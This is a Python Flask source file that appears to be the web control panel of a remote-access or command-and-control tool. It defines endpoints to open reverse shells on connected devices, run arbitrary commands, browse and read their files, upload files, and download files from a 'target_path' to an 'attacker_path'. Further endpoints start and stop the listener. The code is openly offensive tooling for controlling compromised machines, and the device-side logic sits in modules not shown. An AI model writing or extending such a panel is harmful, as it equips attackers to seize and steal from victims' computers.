from Utils import *
from Web.Endpoints.authorization import authorized, admin

def devices_enpoints(Server):
    devices = Blueprint("devices", __name__, url_prefix="/devices")
    
    @devices.route("/revshell", methods=["POST"])
    @authorized
    def revshell():
        id = request.form.get("id")
        address = request.form.get("address")
        port = request.form.get("port")
        try:
            Server.get_device(id).revshell(address, port)
        except Exception as e:
            return jsonify({"status": "error", "message": "Couldn't open a Reverse Shell"})
        else:
            return jsonify({"status": "success", "message": "Reverse Shell Opened"})

    @devices.route("/rce", methods=["POST"])
    @authorized
    def rce():
        id = request.form.get("id")
        cmd = request.form.get("cmd")
        try:
            output = Server.get_device(id).rce(cmd)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices.route("/infos", methods=["GET"])
    @authorized
    def infos():
        id = request.args.get("id")
        output = Server.get_device(id).infos()
        try:
            output = Server.get_device(id).infos()
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices.route("/dir", methods=["GET"])
    @authorized
    def dir():
        id = request.args.get("id")
        dir = request.args.get("dir")
        try:
            output = Server.get_device(id).get_directory_contents(dir)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices.route("/file", methods=["GET"])
    @authorized
    def file():
        id = request.args.get("id")
        path = request.args.get("path")
        try:
            output = Server.get_device(int(id)).get_file_contents(path)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices.route("/upload", methods=["POST"])
    @authorized
    def upload():
        id = request.form.get("id")
        fil = request.form.get("fil")
        path = request.form.get("path")
        try:
            output = Server.get_device(id).file_upload(fil)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices.route("/download", methods=["POST"])
    @authorized
    def download():
        id = request.form.get("id")
        target_path = request.form.get("target_path")
        attacker_path = request.form.get("attacker_path")
        try:
            output = Server.file_download(
                id, target_path, attacker_path)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices.route("/start", methods=["POST"])
    @admin
    def start():
        address = request.form.get("address")
        port = request.form.get("port")
        try:
            Server.start(address, port)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500
        else:
            return jsonify({"status": "success", "output": "Server started"}), 200

    @devices.route("/stop", methods=["POST"])
    @admin
    def stop():
        try:
            Server.stop()
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500
        else:
            return jsonify({"status": "success", "output": "Server stopped"}), 200

    @devices.route("/connections", methods=["GET"])
    @authorized
    def connections():
        return jsonify({"status": "success", "output": Server.connections}), 200
    return devices
